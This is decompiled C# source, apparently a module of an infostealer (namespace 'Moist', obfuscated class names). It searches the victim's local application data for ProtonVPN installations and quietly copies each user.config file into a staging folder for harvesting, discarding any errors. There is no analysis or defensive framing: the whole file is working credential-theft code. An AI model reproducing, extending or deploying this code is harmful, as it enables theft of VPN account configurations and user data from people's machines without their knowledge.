using System;
using System.IO;
using Moist;

// Token: 0x02000058 RID: 88
internal class Class25
{
	// Token: 0x06000241 RID: 577 RVA: 0x0001281C File Offset: 0x00010A1C
	public static void smethod_0(string string_0)
	{
		try
		{
			string localData = Help.LocalData;
			if (Directory.Exists(localData + "\\ProtonVPN"))
			{
				string[] directories = Directory.GetDirectories(localData + "\\ProtonVPN");
				Directory.CreateDirectory(string_0 + "\\Vpn\\ProtonVPN\\");
				foreach (string text in directories)
				{
					if (text.StartsWith(localData + "\\ProtonVPN\\ProtonVPN.exe"))
					{
						string name = new DirectoryInfo(text).Name;
						string[] directories2 = Directory.GetDirectories(text);
						Directory.CreateDirectory(string.Concat(new string[]
						{
							string_0,
							"\\Vpn\\ProtonVPN\\",
							name,
							"\\",
							new DirectoryInfo(directories2[0]).Name
						}));
						File.Copy(directories2[0] + "\\user.config", string.Concat(new string[]
						{
							string_0,
							"\\Vpn\\ProtonVPN\\",
							name,
							"\\",
							new DirectoryInfo(directories2[0]).Name,
							"\\user.config"
						}));
						Class25.int_0++;
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000242 RID: 578 RVA: 0x0000446C File Offset: 0x0000266C
	public Class25()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x04000104 RID: 260
	public static int int_0;
}
